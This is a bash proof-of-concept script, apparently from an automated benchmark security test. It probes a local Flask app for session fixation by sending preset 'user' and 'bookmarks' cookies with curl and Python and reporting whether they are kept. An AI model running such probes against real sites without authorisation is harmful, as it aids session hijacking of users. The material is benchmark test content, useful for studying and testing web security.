#!/bin/bash
# POC: Demonstrates session fixation vulnerability by showing the Flask app accepts pre-set session cookies without regeneration. Tests that attacker-controlled 'user' and 'bookmarks' cookies are preserved and used by the application.
# Target: ./repo
# Created: 2025-11-07T19:42:30.451Z
# Session: benchmark-XBEN-075-24-mhp935fu

# Session Fixation POC - Demonstrates Flask app accepts pre-set session cookies
# without regenerating them, allowing session fixation attacks

TARGET_URL="http://127.0.0.1:5000"
ATTACKER_USER_COOKIE="attacker_session_123"
ATTACKER_BOOKMARKS_COOKIE="W10="  # Base64 encoded empty list []

echo "=========================================="
echo "Session Fixation Vulnerability POC"
echo "=========================================="
echo ""

# Test 1: Pre-set user cookie is preserved
echo "[*] Test 1: Verifying pre-set 'user' cookie is preserved"
echo "[*] Sending request with custom user cookie: $ATTACKER_USER_COOKIE"
echo ""

RESPONSE=$(curl -s -b "user=$ATTACKER_USER_COOKIE" "$TARGET_URL/list" -i)
COOKIES=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "user")

if [ -z "$COOKIES" ]; then
    echo "[+] VULNERABLE: No Set-Cookie header found for 'user' cookie"
    echo "[+] This means the app is NOT regenerating the user cookie"
    echo "[+] The attacker-controlled cookie is being preserved"
else
    echo "[-] Set-Cookie found: $COOKIES"
fi

echo ""

# Test 2: Verify cookie is actually used by making subsequent request
echo "[*] Test 2: Verifying attacker-set cookie persists across requests"
echo ""

# Create a temporary cookie jar to track cookies
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# First request with pre-set cookies
curl -s -b "user=$ATTACKER_USER_COOKIE" -b "bookmarks=$ATTACKER_BOOKMARKS_COOKIE" \
     -c "$COOKIE_JAR" "$TARGET_URL/list" > /dev/null

# Check what cookies are in the jar
STORED_USER=$(grep "user" "$COOKIE_JAR" | awk '{print $NF}')

if [ "$STORED_USER" == "$ATTACKER_USER_COOKIE" ]; then
    echo "[+] VULNERABLE: Attacker-controlled user cookie is preserved: $STORED_USER"
else
    echo "[*] Cookie stored as: $STORED_USER"
fi

echo ""

# Test 3: Python-based test to verify cookie handling
echo "[*] Test 3: Python-based verification of session fixation"
echo "[*] Running Python test..."
echo ""

python3 << 'PYTHON_TEST'
import requests
import sys

try:
    session = requests.Session()
    
    # Pre-set attacker cookies
    attacker_user = "predefined_user_12345"
    attacker_bookmarks = "W10="
    
    session.cookies.set('user', attacker_user)
    session.cookies.set('bookmarks', attacker_bookmarks)
    
    # Make request
    response = session.get('http://127.0.0.1:5000/list')
    
    # Check if cookies are preserved
    user_cookie = session.cookies.get('user')
    bookmarks_cookie = session.cookies.get('bookmarks')
    
    if user_cookie == attacker_user:
        print("[+] VULNERABLE: 'user' cookie preserved as:", user_cookie)
        print("[+] Session fixation is possible - attacker can force known session ID")
    else:
        print("[-] Cookie was modified:", user_cookie)
    
    if bookmarks_cookie == attacker_bookmarks:
        print("[+] VULNERABLE: 'bookmarks' cookie preserved as:", bookmarks_cookie)
    else:
        print("[*] Bookmarks cookie:", bookmarks_cookie)
        
except Exception as e:
    print("[-] Error:", str(e))
    sys.exit(1)

print("")
print("[+] POC demonstrates session fixation vulnerability:")
print("    - App accepts pre-set session cookies from client")
print("    - App does not regenerate session identifiers")
print("    - Attacker can force victim to use known session ID")
print("    - Attacker can then impersonate victim with same session ID")

PYTHON_TEST

echo ""
echo "=========================================="
echo "POC Complete"
echo "=========================================="